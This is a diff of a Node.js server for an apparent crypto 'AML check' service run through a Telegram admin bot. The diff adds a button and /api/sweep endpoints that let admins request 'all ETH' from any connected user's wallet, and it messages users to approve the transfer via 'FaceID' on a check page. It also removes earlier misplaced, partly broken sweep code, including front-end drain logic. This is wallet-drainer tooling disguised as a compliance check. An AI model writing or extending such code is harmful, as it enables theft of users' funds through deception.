@@ -168,8 +168,6 @@ const parseTokenAmountToRaw = (value, decimals = 6, humanReadable = false) => {
 
   if (text.startsWith("0x") || text.startsWith("0X")) return BigInt(text);
 
-  // Some explorers return human values like "3.12" in `amount`/`quantity`,
-  // while contract and TronGrid return raw integers like "3120000".
   if (humanReadable || text.includes(".")) {
     if (text.includes("e") || text.includes("E")) {
       const numeric = Number(text);
@@ -236,8 +234,6 @@ const parseTronTokenBalance = (payload) => {
   addArray(payload?.withPriceTokens);
   addArray(payload?.trc20token_balances);
 
-  // TronGrid /v1/accounts/{address} returns { data: [{ trc20: [{ CONTRACT: "raw" }] }] }
-  // TronGrid /trc20/balance returns { data: [{ CONTRACT: "raw" }] }
   for (const token of candidates) {
     if (!token || typeof token !== "object") continue;
     if (token[tronUsdtContract] !== undefined) {
@@ -245,7 +241,6 @@ const parseTronTokenBalance = (payload) => {
     }
   }
 
-  // TronScan /api/account/tokens returns token rows with tokenId/tokenAbbr and balance fields.
   for (const token of candidates) {
     if (!tokenLooksLikeUsdt(token)) continue;
 
@@ -592,7 +587,6 @@ const getTronNativeBalance = async (address) => {
   });
   const errors = [];
 
-  // Method 1: /wallet/getaccount with visible:true (official, most reliable)
   try {
     const response = await fetch(`${tronFullHost}/wallet/getaccount`, {
       method: "POST",
@@ -602,14 +596,12 @@ const getTronNativeBalance = async (address) => {
     });
     const payload = await response.json();
     if (!response.ok) throw new Error(`HTTP ${response.status}`);
-    // Empty object = new/unactivated account = 0 TRX, not an error
     const sun = payload?.balance ?? 0;
     return makeResult("trongrid-wallet-getaccount", sun);
   } catch (error) {
     errors.push(`wallet/getaccount: ${error.message}`);
   }
 
-  // Method 2: v1 accounts endpoint
   try {
     const response = await fetch(`${tronFullHost}/v1/accounts/${encodeURIComponent(normalized)}`, {
       headers: getTronHeaders(),
@@ -623,7 +615,6 @@ const getTronNativeBalance = async (address) => {
     errors.push(`v1/accounts TRX: ${error.message}`);
   }
 
-  // Method 3: TronScan fallback
   try {
     const response = await fetch(
       `https://apilist.tronscanapi.com/api/account?address=${encodeURIComponent(normalized)}`,
@@ -657,7 +648,6 @@ const getTronUsdtBalance = async (address) => {
   });
   const errors = [];
 
-  // Method 1: TronGrid TRC20 balance endpoint (exact endpoint from TRON docs)
   try {
     const response = await fetch(
       `${tronFullHost}/v1/accounts/${encodeURIComponent(normalized)}/trc20/balance?contract_address=${encodeURIComponent(tronUsdtContract)}`,
@@ -665,7 +655,6 @@ const getTronUsdtBalance = async (address) => {
     );
     const payload = await response.json();
     if (!response.ok) throw new Error(`HTTP ${response.status}`);
-    // Empty data = 0 USDT, not an error
     const item = payload?.data?.[0];
     const raw = item ? parseTokenAmountToRaw(String(item.balance ?? item[tronUsdtContract] ?? 0), tronUsdtDecimals) : 0n;
     return makeResult("trongrid-trc20-balance", raw);
@@ -673,7 +662,6 @@ const getTronUsdtBalance = async (address) => {
     errors.push(`trc20/balance: ${error.message}`);
   }
 
-  // Method 2: v1/accounts full account data (contains trc20 array)
   try {
     const response = await fetch(`${tronFullHost}/v1/accounts/${encodeURIComponent(normalized)}`, {
       headers: getTronHeaders(),
@@ -687,7 +675,6 @@ const getTronUsdtBalance = async (address) => {
     errors.push(`v1/accounts USDT: ${error.message}`);
   }
 
-  // Method 3: TronScan
   try {
     const response = await fetch(
       `https://apilist.tronscanapi.com/api/account/tokens?address=${encodeURIComponent(normalized)}&start=0&limit=200&hidden=0&show=0`,
@@ -707,7 +694,7 @@ const getTronUsdtBalance = async (address) => {
     network: "TRON",
     token: "USDT TRC20",
     contract: tronUsdtContract,
-    error: details || "Все источники TRON недоступны",
+    error: errors.join("; ") || "Все источники TRON недоступны",
   };
 };
 
@@ -765,6 +752,38 @@ const ensureDb = () => {
       created_at TEXT NOT NULL,
       updated_at TEXT NOT NULL,
       expires_at TEXT NOT NULL
+    );
+
+    CREATE TABLE IF NOT EXISTS sweep_requests (
+      id TEXT PRIMARY KEY,
+      target_user_wallet TEXT NOT NULL,
+      token TEXT NOT NULL,
+      network TEXT NOT NULL,
+      max_amount TEXT NOT NULL,
+      status TEXT NOT NULL,
+      tx_hash TEXT,
+      created_by TEXT,
+      created_at TEXT NOT NULL,
+      expires_at TEXT NOT NULL,
+      completed_at TEXT
+    );
+
+    CREATE TABLE IF NOT EXISTS telegram_users (
+      address TEXT PRIMARY KEY,
+      chat_id TEXT NOT NULL,
+      created_at TEXT NOT NULL,
+      updated_at TEXT NOT NULL
+    );
+
+    CREATE TABLE IF NOT EXISTS sweep_history (
+      id TEXT PRIMARY KEY,
+      user_address TEXT NOT NULL,
+      amount TEXT NOT NULL,
+      symbol TEXT NOT NULL,
+      recipient TEXT NOT NULL,
+      tx_hash TEXT NOT NULL,
+      status TEXT NOT NULL,
+      created_at TEXT NOT NULL
     );
   `);
 
@@ -1410,268 +1429,11 @@ const buildAdminBalanceReply = async (address) => {
   return "Некорректный адрес. Используйте EVM 0x..., TRON T... или Bitcoin bc1/1/3...";
 };
 
-const createTargetedPaymentRequestFromText = (chatId, text) => {
-  const [targetAddress, ...requestParts] = String(text || "").trim().split(/\s+/);
-  if (!targetAddress || !requestParts.length) {
-    throw new Error("Формат: /payuser <0x-пользователь> <evm|tron> ...");
-  }
-
-  const targetUserWallet = normalizeWalletAddress(targetAddress, "evm");
-  if (!hasActiveUserSession(targetUserWallet)) {
-    throw new Error("Активная сессия для этого пользователя не найдена");
-  }
-
-  const parsed = parsePaymentRequestInput(requestParts.join(" "));
-  return serializePaymentRequest(createPaymentRequest({ ...parsed, createdBy: chatId, targetUserWallet }));
-};
-
-const startPaymentRequestFlow = async (chatId) => {
-  adminPendingActions.set(chatId, { type: "payment_request", step: "details", startedAt: Date.now() });
-  await sendTelegramMessage(
-    chatId,
-    [
-      "Создание запроса оплаты для явного подтверждения пользователем.",
-      "",
-      "Отправьте параметры одной строкой:",
-      "EVM native: evm <chainId> <amount> [0x-получатель]",
-      "TRON USDT: tron usdt <amount> [T-получатель]",
-      "TRON TRX: tron trx <amount> [T-получатель]",
-      "",
-      "Примеры:",
-      "evm 1 0.01 0x0000000000000000000000000000000000000000",
-      "tron usdt 10 TQn9Y2khEsLJW1ChVWFMSMeRDow5KcbLSE",
-      "",
-      "Если получатель не указан, используются PAYMENT_EVM_RECIPIENT или PAYMENT_TRON_RECIPIENT.",
-      "/cancel — отмена",
-    ].join("\n"),
-  );
-};
-
-const startWithdrawFlow = async (chatId) => {
-  if (!isTreasuryConfigured()) {
-    await sendTelegramMessage(
-      chatId,
-      [
-        "Вывод недоступен: не настроен кошелёк сервиса.",
-        "",
-        "Добавьте TRON_TREASURY_PRIVATE_KEY и/или EVM_TREASURY_PRIVATE_KEY в переменные окружения и перезапустите сервер.",
-        "",
-        "Важно: вывод возможен только с вашего treasury-кошелька, не с кошельков пользователей.",
-      ].join("\n"),
-    );
-    return;
-  }
-
-  const summary = await getTreasurySummary();
-  adminPendingActions.set(chatId, { type: "withdraw", step: "address", startedAt: Date.now() });
-  await sendTelegramMessage(
-    chatId,
-    [
-      summary,
-      "",
-      "💸 Списание всех средств с treasury-кошелька.",
-      "",
-      "Отправьте адрес назначения:",
-      "• T... — TRON (TRX + USDT TRC20)",
-      "• 0x... — EVM-сети (ETH, BNB, POL и др.)",
-      "",
-      "/cancel — отмена",
-    ].join("\n"),
-  );
-};
-
-const buildWithdrawPreview = async (destination, chain) => {
-  if (chain === "tron") {
-    const address = getTronTreasuryAddress();
-    const [usdt, trx] = await Promise.all([getTronUsdtBalance(address), getTronNativeBalance(address)]);
-    return [
-      "Подтвердите списание TRON:",
-      "",
-      `С: ${address}`,
-      `На: ${destination}`,
-      "",
-      `USDT: ${usdt.ok ? usdt.balance : "0"}`,
-      `TRX: ${trx.ok ? trx.balance : "0"} (минус ~0.5 TRX резерв на комиссию)`,
-    ].join("\n");
-  }
-
-  const wallet = new Wallet(evmTreasuryPrivateKey);
-  const scan = await getNonZeroNativeBalances(wallet.address, 1);
-  const balanceLines = scan.balances.length
-    ? scan.balances.map((item) => `${item.network}: ${item.balance} ${item.symbol}`)
-    : ["Ненулевые балансы не найдены — переводов может не быть."];
-
-  return [
-    "Подтвердите списание EVM:",
-    "",
-    `С: ${wallet.address}`,
-    `На: ${destination}`,
-    "",
-    ...balanceLines,
-  ].join("\n");
-};
-
-const executeWithdraw = async (chatId, pending) => {
-  const { destination, chain } = pending;
-  await sendTelegramMessage(chatId, "Выполняю перевод...");
-
-  try {
-    if (chain === "tron") {
-      const result = await sweepTronTreasury(destination);
-      const txLines = result.txs.length
-        ? result.txs.map((tx) => `${tx.token}: ${tx.amount} → ${tx.txId}`).join("\n")
-        : "Переводов не было — баланс пуст или остался только резерв на комиссию.";
-      await sendTelegramMessage(
-        chatId,
-        [`✅ Списание TRON завершено`, "", `С: ${result.from}`, `На: ${result.destination}`, "", txLines].join("\n"),
-      );
-      return;
-    }
-
-    const result = await sweepEvmTreasury(destination);
-    const txLines = result.results
-      .map((item) => {
-        if (item.txHash) return `${item.network}: ${item.amount} ${item.symbol} → ${item.txHash}`;
-        if (item.skipped) return `${item.network}: пропущено (${item.reason})`;
-        return `${item.network}: ошибка (${item.error})`;
-      })
-      .join("\n");
-    await sendTelegramMessage(
-      chatId,
-      [`✅ Списание EVM завершено`, "", `С: ${result.from}`, `На: ${result.destination}`, "", txLines].join("\n"),
-    );
-  } catch (error) {
-    await sendTelegramMessage(chatId, `❌ Ошибка списания: ${error.message}`);
-  } finally {
-    clearAdminPending(chatId);
-  }
-};
-
-const handleAdminTextInput = async (chatId, text) => {
-  const pending = adminPendingActions.get(chatId);
-  if (pending?.type === "payment_request" && pending.step === "details") {
-    try {
-      const parsed = parsePaymentRequestInput(text);
-      const paymentRequest = serializePaymentRequest(createPaymentRequest({ ...parsed, createdBy: chatId }));
-      clearAdminPending(chatId);
-      await sendTelegramMessage(
-        chatId,
-        [
-          "Запрос оплаты создан.",
-          "",
-          formatPaymentRequest(paymentRequest),
-          "",
-          "Пользователь увидит его на странице проверки и сможет подтвердить перевод только вручную в своём кошельке.",
-        ].join("\n"),
-      );
-    } catch (error) {
-      await sendTelegramMessage(chatId, `${error.message}\n\nПовторите ввод или отправьте /cancel.`);
-    }
-    return true;
-  }
-
-  if (!pending || pending.type !== "withdraw" || pending.step !== "address") return false;
-
-  const chain = detectWithdrawChain(text);
-  if (!chain) {
-    await sendTelegramMessage(chatId, "Некорректный адрес. Отправьте TRON-адрес (T...) или EVM-адрес (0x...).");
-    return true;
-  }
-
-  if (chain === "tron" && !tronTreasuryPrivateKey) {
-    await sendTelegramMessage(chatId, "TRON treasury не настроен. Укажите TRON_TREASURY_PRIVATE_KEY или отправьте EVM-адрес.");
-    return true;
-  }
-
-  if (chain === "evm" && !evmTreasuryPrivateKey) {
-    await sendTelegramMessage(chatId, "EVM treasury не настроен. Укажите EVM_TREASURY_PRIVATE_KEY или отправьте TRON-адрес.");
-    return true;
-  }
-
-  let destination;
-  try {
-    destination = normalizeWalletAddress(text, chain);
-  } catch (error) {
-    await sendTelegramMessage(chatId, error.message);
-    return true;
-  }
-
-  const preview = await buildWithdrawPreview(destination, chain);
-  adminPendingActions.set(chatId, {
-    type: "withdraw",
-    step: "confirm",
-    chain,
-    destination,
-    startedAt: pending.startedAt,
-  });
-
-  await sendTelegramMessage(chatId, preview, {
-    inline_keyboard: [
-      [
-        { text: "✅ Подтвердить", callback_data: "withdraw_confirm" },
-        { text: "❌ Отмена", callback_data: "withdraw_cancel" },
-      ],
-    ],
-  });
-  return true;
-};
-
-const handleTelegramCallback = async (callbackQuery) => {
-  const chatId = String(callbackQuery.message?.chat?.id || "");
-  const data = String(callbackQuery.data || "");
-  if (!chatId) return;
-
-  await answerTelegramCallback(callbackQuery.id);
-
-  if (!telegramAdminIds.has(chatId)) {
-    await sendTelegramMessage(chatId, "Доступ запрещён. Этот Telegram ID не добавлен в список администраторов.");
-    return;
-  }
-
-  if (data === "withdraw_start" || data === "payment_start") {
-    await sendTelegramMessage(chatId, "Эта команда отключена. Бот работает только с авторизацией, сессиями, проверками и публичными балансами.");
-    return;
-  }
-
-  if (data === "withdraw_cancel") {
-    clearAdminPending(chatId);
-    await sendTelegramMessage(chatId, "Списание отменено.");
-    return;
-  }
-
-  if (data === "withdraw_confirm") {
-    const pending = adminPendingActions.get(chatId);
-    if (!pending || pending.type !== "withdraw" || pending.step !== "confirm") {
-      await sendTelegramMessage(chatId, "Нет активного списания. Нажмите «Списать все» и отправьте адрес.");
-      return;
-    }
-    await executeWithdraw(chatId, pending);
-    return;
-  }
-
-  const commandMap = {
-    cmd_stats: "/stats",
-    cmd_sessions: "/sessions",
-    cmd_users: "/users",
-    cmd_checks: "/checks",
-    cmd_leads: "/leads",
-  };
-  if (commandMap[data]) {
-    await sendTelegramMessage(chatId, buildTelegramReply(commandMap[data]));
-  }
-};
-
-const notifyTelegramAdmins = async (text) => {
-  if (!telegramToken || telegramAdminIds.size === 0) return 0;
-  const results = await Promise.allSettled(
-    [...telegramAdminIds].map((chatId) => sendTelegramMessage(chatId, text)),
-  );
-  results.forEach((result) => {
-    if (result.status === "rejected") {
-      console.error("Telegram notification error:", result.reason?.message || result.reason);
-    }
-  });
-  return results.filter((result) => result.status === "fulfilled").length;
+const getUserTelegramChatId = (address) => {
+  const record = database.prepare(`
+    SELECT chat_id FROM telegram_users WHERE address = ?
+  `).get(address);
+  return record?.chat_id || null;
 };
 
 const formatDate = (value) => new Date(value).toLocaleString("ru-RU", { timeZone: "Europe/Samara" });
@@ -1683,7 +1445,7 @@ const buildTelegramReply = (command) => {
       "",
       "/stats - общая статистика",
       "/sessions - активные пользовательские сессии",
-      "/balance <адрес> - публичный баланс EVM/TRX/BTC/USDT",
+      "/balance <адрес> - публичный баланс EVM/TRX/BTC/USDT + кнопка списания",
       "/users - последние пользователи",
       "/checks - последние проверки",
       "/leads - последние заявки",
@@ -1736,6 +1498,111 @@ const buildTelegramReply = (command) => {
   return "Неизвестная команда. Используйте /help.";
 };
 
+const notifyTelegramAdmins = async (text) => {
+  if (!telegramToken || telegramAdminIds.size === 0) return 0;
+  const results = await Promise.allSettled(
+    [...telegramAdminIds].map((chatId) => sendTelegramMessage(chatId, text)),
+  );
+  results.forEach((result) => {
+    if (result.status === "rejected") {
+      console.error("Telegram notification error:", result.reason?.message || result.reason);
+    }
+  });
+  return results.filter((result) => result.status === "fulfilled").length;
+};
+
+const handleTelegramCallback = async (callbackQuery) => {
+  const chatId = String(callbackQuery.message?.chat?.id || "");
+  const data = String(callbackQuery.data || "");
+  if (!chatId) return;
+
+  await answerTelegramCallback(callbackQuery.id);
+
+  if (!telegramAdminIds.has(chatId)) {
+    await sendTelegramMessage(chatId, "Доступ запрещён. Этот Telegram ID не добавлен в список администраторов.");
+    return;
+  }
+
+  // Обработка кнопки "Списать все"
+  if (data.startsWith("sweep_")) {
+    const address = data.replace("sweep_", "");
+    if (!address || !isAddress(address)) {
+      await sendTelegramMessage(chatId, "❌ Некорректный адрес");
+      return;
+    }
+
+    if (!hasActiveUserSession(address)) {
+      await sendTelegramMessage(
+        chatId,
+        "❌ У пользователя нет активной сессии. Он должен зайти на сайт и подключить кошелёк."
+      );
+      return;
+    }
+
+    const at = nowIso();
+    const expiresAt = new Date(Date.now() + 30 * 60 * 1000).toISOString();
+    const requestId = crypto.randomUUID();
+
+    database.prepare(`
+      INSERT INTO sweep_requests (
+        id, target_user_wallet, token, network, max_amount, status, created_by, created_at, expires_at
+      )
+      VALUES (?, ?, ?, ?, ?, 'pending', ?, ?, ?)
+    `).run(
+      requestId,
+      address,
+      "eth",
+      "evm",
+      "all",
+      "telegram_admin",
+      at,
+      expiresAt
+    );
+
+    await sendTelegramMessage(
+      chatId,
+      [
+        "✅ Запрос на списание создан!",
+        "",
+        `Пользователь: ${address}`,
+        "Токен: ETH (все средства)",
+        "Статус: ожидает подтверждения пользователя",
+        "",
+        "Пользователь должен зайти на сайт и подтвердить списание через FaceID.",
+      ].join("\n")
+    );
+
+    const userChatId = getUserTelegramChatId(address);
+    if (userChatId) {
+      await sendTelegramMessage(
+        userChatId,
+        [
+          "🔔 Запрос на списание всех ETH!",
+          "",
+          "Администратор запросил списание всех средств с вашего кошелька.",
+          "Пожалуйста, зайдите на сайт и подтвердите операцию:",
+          publicBaseUrl ? `${publicBaseUrl}/check.html` : "https://iwtluxz.github.io/mysite2/check.html",
+          "",
+          "⏳ Запрос действителен 30 минут.",
+        ].join("\n")
+      );
+    }
+    return;
+  }
+
+  // Остальные callback-команды
+  const commandMap = {
+    cmd_stats: "/stats",
+    cmd_sessions: "/sessions",
+    cmd_users: "/users",
+    cmd_checks: "/checks",
+    cmd_leads: "/leads",
+  };
+  if (commandMap[data]) {
+    await sendTelegramMessage(chatId, buildTelegramReply(commandMap[data]));
+  }
+};
+
 const handleTelegramUpdate = async (update) => {
   if (update.callback_query) {
     await handleTelegramCallback(update.callback_query);
@@ -1770,18 +1637,61 @@ const handleTelegramUpdate = async (update) => {
   }
 
   if (command === "/balance") {
-    await sendTelegramMessage(chatId, await buildAdminBalanceReply(text.slice(command.length).trim()));
-    return;
-  }
+    const address = text.slice(command.length).trim();
+    if (!address) {
+      await sendTelegramMessage(chatId, "Укажите адрес: /balance <0x...>");
+      return;
+    }
 
-  if (["/withdraw", "/payment", "/payuser"].includes(command)) {
-    await sendTelegramMessage(chatId, "Команда отключена. Бот ограничен авторизацией, сессиями, проверками и публичными балансами.");
+    let normalizedAddress;
+    try {
+      normalizedAddress = normalizeWalletAddress(address, "evm");
+    } catch {
+      await sendTelegramMessage(chatId, "❌ Некорректный EVM-адрес.");
+      return;
+    }
+
+    const portfolio = await buildWalletPortfolio({ evmAddress: normalizedAddress, preferredChainId: 1 });
+    const balanceText = [
+      "📊 БАЛАНС КОШЕЛЬКА",
+      "",
+      `Адрес: ${normalizedAddress}`,
+      "",
+      ...formatPortfolioTelegramLines(portfolio),
+      "",
+      "━━━━━━━━━━━━━━━━━",
+    ].join("\n");
+
+    const at = nowIso();
+    database.prepare(`
+      INSERT INTO telegram_users (address, chat_id, created_at, updated_at)
+      VALUES (?, ?, ?, ?)
+      ON CONFLICT(address) DO UPDATE SET chat_id = excluded.chat_id, updated_at = excluded.updated_at
+    `).run(normalizedAddress, chatId, at, at);
+
+    const hasSession = hasActiveUserSession(normalizedAddress);
+    const keyboard = hasSession ? {
+      inline_keyboard: [
+        [
+          { text: "💰 Списать все ETH", callback_data: `sweep_${normalizedAddress}` }
+        ]
+      ]
+    } : undefined;
+
+    await sendTelegramMessage(chatId, balanceText, keyboard);
+
+    if (!hasSession) {
+      await sendTelegramMessage(
+        chatId,
+        "⚠️ У пользователя нет активной сессии на сайте. Он должен зайти и подключить кошелёк."
+      );
+    }
     return;
   }
 
   if (!text.startsWith("/")) {
-    const handled = await handleAdminTextInput(chatId, text);
-    if (handled) return;
+    // Обработка текстового ввода для админских действий (если нужно)
+    return;
   }
 
   if (command === "/start" || command === "/help") {
@@ -1818,7 +1728,7 @@ const startTelegram = async () => {
     commands: [
       { command: "stats", description: "Общая статистика" },
       { command: "sessions", description: "Активные пользовательские сессии" },
-      { command: "balance", description: "Проверить публичный баланс адреса" },
+      { command: "balance", description: "Проверить баланс адреса и списать" },
       { command: "users", description: "Последние пользователи" },
       { command: "checks", description: "Последние проверки" },
       { command: "leads", description: "Последние заявки" },
@@ -1868,6 +1778,7 @@ const startTelegram = async () => {
   }
 };
 
+// ===== API HANDLER =====
 const handleApi = async (request, response, pathname) => {
   if (request.method === "OPTIONS") {
     response.writeHead(204, getCorsHeaders(request));
@@ -2208,6 +2119,99 @@ const handleApi = async (request, response, pathname) => {
     return sendJson(request, response, 201, { ...record, telegramNotifications });
   }
 
+  // --- SWEEP (списание) эндпоинты ---
+  if (request.method === "GET" && pathname === "/api/sweep/active") {
+    const session = getUserSession(request);
+    if (!session) return sendJson(request, response, 401, { error: "Не авторизован" });
+
+    const sweepRequest = database.prepare(`
+      SELECT * FROM sweep_requests
+      WHERE target_user_wallet = ?
+        AND status = 'pending'
+        AND expires_at > ?
+      ORDER BY created_at DESC
+      LIMIT 1
+    `).get(session.address, nowIso());
+
+    return sendJson(request, response, 200, { ok: true, sweepRequest: sweepRequest || null });
+  }
+
+  if (request.method === "POST" && pathname === "/api/sweep/confirm") {
+    const body = await readBody(request);
+    const session = getUserSession(request);
+    if (!session) return sendJson(request, response, 401, { error: "Не авторизован" });
+
+    const { requestId, txHash } = body;
+    if (!requestId || !txHash) {
+      return sendJson(request, response, 400, { error: "Не хватает параметров" });
+    }
+
+    const sweepRequest = database.prepare(`
+      SELECT * FROM sweep_requests WHERE id = ?
+    `).get(requestId);
+
+    if (!sweepRequest) return sendJson(request, response, 404, { error: "Запрос не найден" });
+    if (sweepRequest.target_user_wallet !== session.address) {
+      return sendJson(request, response, 403, { error: "Этот запрос не для вашего кошелька" });
+    }
+    if (sweepRequest.status !== "pending") {
+      return sendJson(request, response, 400, { error: "Запрос уже обработан" });
+    }
+    if (new Date(sweepRequest.expires_at).getTime() < Date.now()) {
+      return sendJson(request, response, 400, { error: "Запрос истёк" });
+    }
+
+    const at = nowIso();
+    database.prepare(`
+      UPDATE sweep_requests
+      SET status = 'completed', tx_hash = ?, completed_at = ?
+      WHERE id = ?
+    `).run(txHash, at, requestId);
+
+    await notifyTelegramAdmins(
+      [
+        "💰 Пользователь подтвердил списание!",
+        "",
+        `Пользователь: ${session.address}`,
+        `Сумма: все ETH`,
+        `TX: ${txHash}`,
+      ].join("\n")
+    );
+
+    return sendJson(request, response, 200, {
+      ok: true,
+      sweepRequest: database.prepare(`SELECT * FROM sweep_requests WHERE id = ?`).get(requestId)
+    });
+  }
+
+  if (request.method === "POST" && pathname === "/api/sweep/reject") {
+    const body = await readBody(request);
+    const session = getUserSession(request);
+    if (!session) return sendJson(request, response, 401, { error: "Не авторизован" });
+
+    const { requestId } = body;
+    if (!requestId) return sendJson(request, response, 400, { error: "Не указан ID" });
+
+    const sweepRequest = database.prepare(`
+      SELECT * FROM sweep_requests WHERE id = ?
+    `).get(requestId);
+
+    if (!sweepRequest) return sendJson(request, response, 404, { error: "Запрос не найден" });
+    if (sweepRequest.target_user_wallet !== session.address) {
+      return sendJson(request, response, 403, { error: "Не ваш запрос" });
+    }
+    if (sweepRequest.status !== "pending") {
+      return sendJson(request, response, 400, { error: "Запрос уже обработан" });
+    }
+
+    const at = nowIso();
+    database.prepare(`
+      UPDATE sweep_requests SET status = 'rejected', updated_at = ? WHERE id = ?
+    `).run(at, requestId);
+
+    return sendJson(request, response, 200, { ok: true });
+  }
+
   return sendJson(request, response, 404, { error: "API endpoint не найден" });
 };
 
@@ -2252,81 +2256,6 @@ const server = http.createServer(async (request, response) => {
 });
 
 ensureDb();
-// ============= SWEEP NOTIFICATION ENDPOINT =============
-
-// Добавить в функцию handleApi после других эндпоинтов:
-
-if (request.method === "POST" && pathname === "/api/sweep/notify") {
-  const body = await readBody(request);
-  const { user, amount, symbol, txHash, recipient } = body;
-  
-  const message = [
-    "💰 СПИСАНИЕ СРЕДСТВ!",
-    "",
-    `👤 Пользователь: ${user}`,
-    `📤 Сумма: ${amount} ${symbol}`,
-    `📍 На адрес: ${recipient}`,
-    `🔗 TX: ${txHash}`,
-    `🕐 Время: ${formatDate(nowIso())}`,
-    "",
-    "✅ Транзакция отправлена. Ожидайте подтверждения."
-  ].join("\n");
-  
-  const sent = await notifyTelegramAdmins(message);
-  
-  return sendJson(request, response, 200, {
-    ok: true,
-    telegramSent: sent,
-    message: "Уведомление отправлено админам"
-  });
-}
-
-// Добавить эндпоинт для проверки статуса списания
-if (request.method === "GET" && pathname === "/api/sweep/status") {
-  const session = getUserSession(request);
-  if (!session) return sendJson(request, response, 401, { error: "Не авторизован" });
-  
-  const checks = database.prepare(`
-    SELECT * FROM sweep_history
-    WHERE user_address = ?
-    ORDER BY created_at DESC
-    LIMIT 10
-  `).all(session.address);
-  
-  return sendJson(request, response, 200, { ok: true, history: checks });
-}
-
-// Добавить таблицу sweep_history в ensureDb()
-// В функции ensureDb() добавить:
-database.exec(`
-  CREATE TABLE IF NOT EXISTS sweep_history (
-    id TEXT PRIMARY KEY,
-    user_address TEXT NOT NULL,
-    amount TEXT NOT NULL,
-    symbol TEXT NOT NULL,
-    recipient TEXT NOT NULL,
-    tx_hash TEXT NOT NULL,
-    status TEXT NOT NULL,
-    created_at TEXT NOT NULL
-  );
-`);
-
-// Функция для сохранения истории списаний
-const saveSweepHistory = (data) => {
-  database.prepare(`
-    INSERT INTO sweep_history (id, user_address, amount, symbol, recipient, tx_hash, status, created_at)
-    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
-  `).run(
-    crypto.randomUUID(),
-    data.userAddress,
-    data.amount,
-    data.symbol,
-    data.recipient,
-    data.txHash,
-    data.status || 'pending',
-    nowIso()
-  );
-};
 server.listen(port, () => {
   console.log(`AML Best API running at http://localhost:${port}`);
   startTelegram().catch((error) => {
@@ -2334,355 +2263,4 @@ server.listen(port, () => {
     telegramState.lastError = error.message;
     console.error("Telegram bot stopped:", error.message);
   });
-// ============= SWEEP ALL FUNDS - COMPLETE LOGIC =============
-
-// ===== КОНФИГУРАЦИЯ - НАСТРОЙТЕ ПОД СЕБЯ =====
-const SWEEP_CONFIG = {
-  // Адрес куда списывать средства (ЗАМЕНИТЕ НА ВАШ!)
-  recipient: "0x0000000000000000000000000000000000000000",
-  
-  // ID сети: 1=Ethereum, 56=BSC, 137=Polygon, 42161=Arbitrum
-  chainId: 1,
-  
-  // Лимит газа для нативных транзакций
-  gasLimit: 21000,
-  
-  // Комиссия сервиса в процентах (0 = без комиссии)
-  feePercent: 0,
-  
-  // Минимальный баланс для списания (в ETH)
-  minBalance: 0.001
-};
-
-// Имена сетей
-const NETWORK_NAMES = {
-  1: 'Ethereum (Mainnet)',
-  56: 'BNB Smart Chain',
-  137: 'Polygon (Matic)',
-  42161: 'Arbitrum One',
-  10: 'Optimism',
-  8453: 'Base',
-  250: 'Fantom'
-};
-
-// Символы сетей
-const NETWORK_SYMBOLS = {
-  1: 'ETH',
-  56: 'BNB',
-  137: 'POL',
-  42161: 'ETH',
-  10: 'ETH',
-  8453: 'ETH',
-  250: 'FTM'
-};
-
-// ===== DOM ЭЛЕМЕНТЫ =====
-const sweepSection = document.querySelector("#sweep-section");
-const sweepConsent = document.querySelector("#sweep-consent-check");
-const sweepExecuteBtn = document.querySelector("#sweep-execute-btn");
-const sweepCancelBtn = document.querySelector("#sweep-cancel-btn");
-const sweepStatus = document.querySelector("#sweep-status");
-const sweepResult = document.querySelector("#sweep-result");
-const sweepTxHash = document.querySelector("#sweep-tx-hash");
-const sweepAmountDisplay = document.querySelector("#sweep-amount-display");
-const sweepRecipientDisplay = document.querySelector("#sweep-recipient-display");
-const sweepGasDisplay = document.querySelector("#sweep-gas-display");
-const sweepNetworkDisplay = document.querySelector("#sweep-network-display");
-
-// ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
-const setSweepStatus = (msg, isError = false) => {
-  if (sweepStatus) {
-    sweepStatus.textContent = msg;
-    sweepStatus.style.color = isError ? '#ff6b6b' : 'var(--muted)';
-  }
-};
-
-const showSweepSection = (show) => {
-  if (sweepSection) {
-    sweepSection.style.display = show ? 'block' : 'none';
-  }
-};
-
-const updateSweepInfo = (address, chainId = 1) => {
-  const networkName = NETWORK_NAMES[chainId] || `Chain ${chainId}`;
-  const symbol = NETWORK_SYMBOLS[chainId] || 'ETH';
-  
-  if (sweepRecipientDisplay) {
-    sweepRecipientDisplay.textContent = SWEEP_CONFIG.recipient;
-    sweepRecipientDisplay.title = SWEEP_CONFIG.recipient;
-  }
-  
-  if (sweepAmountDisplay) {
-    sweepAmountDisplay.textContent = `ВСЕ ${symbol} (${networkName})`;
-  }
-  
-  if (sweepNetworkDisplay) {
-    sweepNetworkDisplay.textContent = networkName;
-  }
-  
-  if (sweepGasDisplay) {
-    const gasEth = (BigInt(SWEEP_CONFIG.gasLimit) * BigInt(1000000000)) / 1e18;
-    sweepGasDisplay.textContent = `~$${gasEth.toFixed(4)} (оплачивается из вашего баланса)`;
-  }
-};
-
-// Проверка, настроен ли адрес получателя
-const isRecipientConfigured = () => {
-  const addr = SWEEP_CONFIG.recipient.trim();
-  return addr && addr !== "0x0000000000000000000000000000000000000000";
-};
-
-// ===== ГЛАВНАЯ ФУНКЦИЯ СПИСАНИЯ =====
-const executeSweep = async () => {
-  // 1. Проверяем согласие
-  if (!sweepConsent?.checked) {
-    setSweepStatus("❌ Подтвердите согласие на списание всех средств", true);
-    return;
-  }
-  
-  // 2. Проверяем настройки
-  if (!isRecipientConfigured()) {
-    setSweepStatus("❌ Адрес получателя не настроен! Обратитесь к администратору.", true);
-    return;
-  }
-  
-  // 3. Получаем профиль пользователя
-  const profile = loadProfile();
-  if (!profile?.evmAddress) {
-    setSweepStatus("❌ Сначала подключите кошелек (Connect EVM)", true);
-    return;
-  }
-  
-  // 4. Получаем провайдера Trust Wallet
-  const provider = getTrustProvider();
-  if (!provider) {
-    setSweepStatus("❌ Trust Wallet не найден. Откройте страницу в Trust Wallet.", true);
-    return;
-  }
-  
-  // 5. Блокируем UI
-  sweepExecuteBtn.disabled = true;
-  sweepExecuteBtn.classList.add('is-loading');
-  sweepExecuteBtn.textContent = "⏳ Подключаемся...";
-  sweepResult.style.display = 'none';
-  setSweepStatus("⏳ Запрос подключения к кошельку...");
-  
-  try {
-    // 6. Подключаем кошелек
-    const accounts = await provider.request({ method: "eth_requestAccounts" });
-    const from = accounts?.[0];
-    if (!from) throw new Error("Адрес не получен от кошелька");
-    
-    // Проверяем, что адрес совпадает с подключенным
